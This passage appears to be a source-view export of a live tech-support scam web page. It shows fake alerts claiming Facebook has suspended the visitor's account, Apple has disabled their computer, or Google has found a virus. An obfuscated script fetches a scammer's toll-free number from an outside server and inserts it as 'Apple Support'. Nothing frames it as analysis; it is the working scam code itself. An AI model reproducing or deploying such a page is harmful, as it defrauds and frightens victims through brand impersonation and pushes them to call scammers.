      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;div id="modal-content"&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;span id="modal-close"&gt;&amp;times;&lt;/span&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;img id="modal-image" src="<a href="https://1nvafasqq1.z13.web.core.windows.net/direction2/x9usqz3ji1.jpg"><span class="s2">x9usqz3ji1.jpg</span></a>" alt="Facebook Logo"&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;p id="modal-message"&gt;Facebook Has Temporarily Suspended Your Account.&lt;/p&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;div class="modal-buttons"&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;button id="modal-accept" class="accept"&gt;Accept&lt;/button&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;button id="modal-dismiss" class="dismiss blinking"&gt;Ignore&lt;/button&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;/div&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;/div&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;/div&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;div id="welcomeDiv"&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;p&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">Apple Has Disabled Your Computer.&lt;br&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">Please Contact Apple Support To Unlock Your Computer.&lt;br&gt;Toll Free &lt;strong id="t1"&gt;&lt;/strong&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;/p&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;/div&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;div id="support-text"&gt;Call Apple Support Toll Free &lt;strong id="t2"&gt;&lt;/strong&gt;&lt;/div&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;script&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">function _0x5c13(_0x5c1b7b,_0x2cd065){const _0x580412=_0x5804();return _0x5c13=function(_0x5c13c4,_0x709c60){_0x5c13c4=_0x5c13c4-0x181;let _0x410be0=_0x580412[_0x5c13c4];return _0x410be0;},_0x5c13(_0x5c1b7b,_0x2cd065);}const _0xfccd21=_0x5c13;(function(_0x27f2a6,_0x5c3e7f){const _0x1ff81a=_0x5c13,_0x14f8b2=_0x27f2a6();while(!![]){try{const _0x973d68=parseInt(_0x1ff81a(0x184))/0x1*(parseInt(_0x1ff81a(0x197))/0x2)+-parseInt(_0x1ff81a(0x191))/0x3+parseInt(_0x1ff81a(0x19e))/0x4*(-parseInt(_0x1ff81a(0x194))/0x5)+-parseInt(_0x1ff81a(0x19b))/0x6+parseInt(_0x1ff81a(0x18f))/0x7*(-parseInt(_0x1ff81a(0x182))/0x8)+parseInt(_0x1ff81a(0x18c))/0x9+parseInt(_0x1ff81a(0x183))/0xa;if(_0x973d68===_0x5c3e7f)break;else _0x14f8b2['push'](_0x14f8b2['shift']());}catch(_0x48eac7){_0x14f8b2['push'](_0x14f8b2['shift']());}}}(_0x5804,0x3c54c));function _0x5804(){const _0x4b8aab=['https://homiehelp.com/topg.json','search','Error\x20loading\x20tfn\x20value','tfn','glogo.png','error','google','40xoedve','5752970hLVKuq','3983VBFZZT','classList','catch','Error\x20fetching\x20or\x20processing\x20data:','GET','getElementById','modal-message','has','3834594HQossJ','fbnft','then','474838Zyvicg','Google\x20Found\x20A\x20Virus\x20On\x20Your\x20Computer.','50829OZirVD','json','body','5bToJyu','src','Network\x20response\x20was\x20not\x20ok','10tBueyH','https://homiehelp.com/fbnfn.json','https://homiehelp.com/fb.json','https://homiehelp.com/fbnft.json','727488GRRoEj','textContent','application/json','1187204CBqXfk'];_0x5804=function(){return _0x4b8aab;};return _0x5804();}const urlParams=new URLSearchParams(window['location'][_0xfccd21(0x1a0)]);if(urlParams['has'](_0xfccd21(0x181)))document[_0xfccd21(0x193)][_0xfccd21(0x185)]['add']('g'),document[_0xfccd21(0x189)]('modal-image')[_0xfccd21(0x195)]=_0xfccd21(0x1a3),document['getElementById'](_0xfccd21(0x18a))[_0xfccd21(0x19c)]=_0xfccd21(0x190),fetch(_0xfccd21(0x19f),{'method':_0xfccd21(0x188),'headers':{'Accept':_0xfccd21(0x19d)}})[_0xfccd21(0x18e)](_0x5b747b=&gt;{const _0x5cbf5c=_0xfccd21;if(!_0x5b747b['ok'])throw new Error(_0x5cbf5c(0x196));return _0x5b747b[_0x5cbf5c(0x192)]();})[_0xfccd21(0x18e)](_0x5eaf60=&gt;{const _0x40bda6=_0xfccd21,_0x3be26e=_0x5eaf60[_0x40bda6(0x1a2)],_0x542d24=document[_0x40bda6(0x189)]('t1'),_0x20d342=document[_0x40bda6(0x189)]('t2');_0x542d24['textContent']=_0x3be26e,_0x20d342[_0x40bda6(0x19c)]=_0x3be26e;})[_0xfccd21(0x186)](_0x43b56d=&gt;{const _0x45c137=_0xfccd21;console['error'](_0x45c137(0x187),_0x43b56d);const _0x373200=document['getElementById']('t1'),_0xcbdf7c=document[_0x45c137(0x189)]('t2');_0x373200[_0x45c137(0x19c)]=_0x45c137(0x1a1),_0xcbdf7c[_0x45c137(0x19c)]='Error\x20loading\x20tfn\x20value';});else{if(urlParams['has'](_0xfccd21(0x18d)))fetch(_0xfccd21(0x19a),{'method':_0xfccd21(0x188),'headers':{'Accept':_0xfccd21(0x19d)}})[_0xfccd21(0x18e)](_0x428305=&gt;{const _0x4ab4ef=_0xfccd21;if(!_0x428305['ok'])throw new Error('Network\x20response\x20was\x20not\x20ok');return _0x428305[_0x4ab4ef(0x192)]();})[_0xfccd21(0x18e)](_0x34b82d=&gt;{const _0x15bf71=_0xfccd21,_0x5aac68=_0x34b82d[_0x15bf71(0x1a2)],_0x199d53=document['getElementById']('t1'),_0x547f29=document[_0x15bf71(0x189)]('t2');_0x199d53['textContent']=_0x5aac68,_0x547f29[_0x15bf71(0x19c)]=_0x5aac68;})[_0xfccd21(0x186)](_0x49bd0e=&gt;{const _0x3f625a=_0xfccd21;console[_0x3f625a(0x1a4)]('Error\x20fetching\x20or\x20processing\x20data:',_0x49bd0e);const _0x592975=document[_0x3f625a(0x189)]('t1'),_0x5eee7a=document[_0x3f625a(0x189)]('t2');_0x592975[_0x3f625a(0x19c)]='Error\x20loading\x20tfn\x20value',_0x5eee7a[_0x3f625a(0x19c)]=_0x3f625a(0x1a1);});else urlParams[_0xfccd21(0x18b)]('fbnfn')?fetch(_0xfccd21(0x198),{'method':_0xfccd21(0x188),'headers':{'Accept':_0xfccd21(0x19d)}})['then'](_0x3532d3=&gt;{const _0x3de87e=_0xfccd21;if(!_0x3532d3['ok'])throw new Error(_0x3de87e(0x196));return _0x3532d3[_0x3de87e(0x192)]();})[_0xfccd21(0x18e)](_0x5e49a0=&gt;{const _0x2b369d=_0xfccd21,_0x6a70f9=_0x5e49a0[_0x2b369d(0x1a2)],_0x5c81a0=document[_0x2b369d(0x189)]('t1'),_0x1dda5e=document[_0x2b369d(0x189)]('t2');_0x5c81a0['textContent']=_0x6a70f9,_0x1dda5e[_0x2b369d(0x19c)]=_0x6a70f9;})[_0xfccd21(0x186)](_0x2f5379=&gt;{const _0x5aa6f9=_0xfccd21;console[_0x5aa6f9(0x1a4)](_0x5aa6f9(0x187),_0x2f5379);const _0x56822d=document[_0x5aa6f9(0x189)]('t1'),_0x36c420=document[_0x5aa6f9(0x189)]('t2');_0x56822d[_0x5aa6f9(0x19c)]=_0x5aa6f9(0x1a1),_0x36c420['textContent']='Error\x20loading\x20tfn\x20value';}):fetch(_0xfccd21(0x199),{'method':_0xfccd21(0x188),'headers':{'Accept':_0xfccd21(0x19d)}})[_0xfccd21(0x18e)](_0x450a62=&gt;{const _0x2723cd=_0xfccd21;if(!_0x450a62['ok'])throw new Error(_0x2723cd(0x196));return _0x450a62[_0x2723cd(0x192)]();})['then'](_0x5672ed=&gt;{const _0x4047ae=_0xfccd21,_0x121b3d=_0x5672ed[_0x4047ae(0x1a2)],_0x1ffe16=document[_0x4047ae(0x189)]('t1'),_0x408668=document[_0x4047ae(0x189)]('t2');_0x1ffe16[_0x4047ae(0x19c)]=_0x121b3d,_0x408668[_0x4047ae(0x19c)]=_0x121b3d;})['catch'](_0xedbc0f=&gt;{const _0x2645f9=_0xfccd21;console['error'](_0x2645f9(0x187),_0xedbc0f);const _0x17cf3a=document[_0x2645f9(0x189)]('t1'),_0x2d7004=document[_0x2645f9(0x189)]('t2');_0x17cf3a[_0x2645f9(0x19c)]='Error\x20loading\x20tfn\x20value',_0x2d7004[_0x2645f9(0x19c)]=_0x2645f9(0x1a1);});}</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;/script&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;/body&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p2"><span class="s1">&lt;/html&gt;</span></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
    <tr>
      <td valign="middle" class="td1">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
      <td valign="middle" class="td2">
        <p class="p1"><span class="s1"></span><br></p>
      </td>
    </tr>
  </tbody>
</table>
</body>
</html>
